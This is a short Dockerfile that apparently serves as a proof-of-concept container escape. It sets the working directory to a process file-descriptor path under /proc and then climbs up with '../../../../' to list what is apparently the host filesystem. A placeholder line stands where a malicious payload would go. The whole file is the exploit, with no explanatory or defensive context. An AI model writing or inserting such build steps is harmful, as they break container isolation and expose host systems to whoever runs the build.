FROM ubuntu

WORKDIR /proc/self/fd/7/

RUN cd ../../../../ && \
    ls && \
    echo "malicious code here"
